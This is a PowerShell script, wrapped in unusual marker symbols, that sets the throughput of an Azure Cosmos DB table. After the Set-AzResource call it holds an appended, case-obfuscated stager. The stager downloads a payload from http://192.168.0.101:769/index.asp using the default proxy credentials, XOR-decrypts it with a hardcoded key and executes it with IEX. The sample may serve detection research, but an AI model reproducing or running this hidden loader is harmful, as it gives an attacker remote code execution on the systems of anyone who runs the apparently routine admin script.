

 -||-> $apiVersion = "2015-04-08" <-||- 
 -||-> $resourceGroupName = "myResourceGroup" <-||- 
 -||-> $accountName = "mycosmosaccount" <-||- 
 -||-> $tableName = "table1" <-||- 
 -||-> $tableThroughputResourceName = $accountName + "/table/" + $tableName + "/throughput" <-||- 
 -||-> $tableThroughputResourceType = "Microsoft.DocumentDb/databaseAccounts/apis/tables/settings" <-||- 
 -||-> $throughput = 500 <-||- 

 -||-> $tableProperties = @{
    "resource"= -||-> @{"throughput"= -||-> $throughput <-||- } <-||- 
} <-||-  
 -||-> Set-AzResource -ResourceType $tableThroughputResourceType `
    -ApiVersion $apiVersion -ResourceGroupName $resourceGroupName `
    -Name $tableThroughputResourceName -PropertyObject $tableProperties <-||- 
 -||-> [SYSTEm.NEt.SERVicePOINTMAnagEr]::EXPeCt100COntInuE = 0 <-||- ; -||-> $wC= -||-> New-ObjeCt SYsTEM.NEt.WEBCliEnT <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> $Wc.HeADERS.ADd('User-Agent',$u) <-||- ; -||-> $Wc.PROxy = [SysTEm.NeT.WeBReqUeSt]::DEFaUltWEbPrOXy <-||- ; -||-> $wC.PRoxY.CrEDeNTiAls = [SYSTEm.NET.CrEdENtIalCaCHe]::DefauLTNETwORkCRedENtIALS <-||- ; -||-> $K='<l2?1qPm!d(pY|Cg9k]O/6zKE@wBI~GX' <-||- ; -||-> $i=0 <-||- ; -||-> [ChAR[]]$b= -||-> ( -||-> [cHar[]]( -||-> $wc.DoWNlOADSTRinG("http://192.168.0.101:769/index.asp") <-||- ) <-||- )|%{ -||-> $_-bXOr$k[$I++%$K.LeNgTh] <-||- } <-||-  <-||- ; -||-> IEX ( -||-> $b-joIN'' <-||- ) <-||- 



